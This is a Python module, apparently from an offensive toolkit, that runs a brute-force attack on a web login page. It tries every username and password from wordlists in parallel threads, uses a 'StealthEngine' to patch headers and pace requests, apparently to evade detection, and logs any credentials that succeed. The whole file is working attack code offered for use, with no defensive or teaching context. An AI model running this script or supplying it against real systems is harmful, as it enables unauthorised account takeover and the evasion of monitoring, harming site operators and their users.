import requests
from concurrent.futures import ThreadPoolExecutor
from advanced.stealth_bypass import StealthEngine
from utils.logger import LOGGER

def attempt_login(url: str, username: str, password: str, stealth: StealthEngine) -> bool:
    """Attempt to log in with a single username/password pair"""
    try:
        response = requests.post(
            url,
            data={"username": username, "password": password},
            headers=stealth.patch_headers({}),
            allow_redirects=False,
            timeout=10
        )
        stealth.delay()
        # Check for a successful login (e.g., redirect to dashboard)
        return response.status_code == 302 and "dashboard" in response.headers.get("Location", "")
    except Exception as e:
        LOGGER.debug(f"Login attempt error: {e}")
    return False

def run(target: str, config: dict) -> list:
    """Brute-force a login page using a wordlist"""
    results = []
    stealth = StealthEngine(config)
    usernames = open("config/wordlists/usernames.txt").read().splitlines()
    passwords = open("config/wordlists/passwords.txt").read().splitlines()

    LOGGER.info(f"Starting brute-force attack on {target}...")
    with ThreadPoolExecutor(max_workers=config["general"]["max_threads"]) as executor:
        futures = []
        for user in usernames:
            for pwd in passwords:
                futures.append(executor.submit(attempt_login, target, user, pwd, stealth))
        for i, future in enumerate(futures):
            if future.result():
                creds = {"username": usernames[i//len(passwords)], "password": passwords[i%len(passwords)]}
                results.append(creds)
                LOGGER.warning(f"Found valid credentials: {creds['username']}:{creds['password']}")
    return results
  
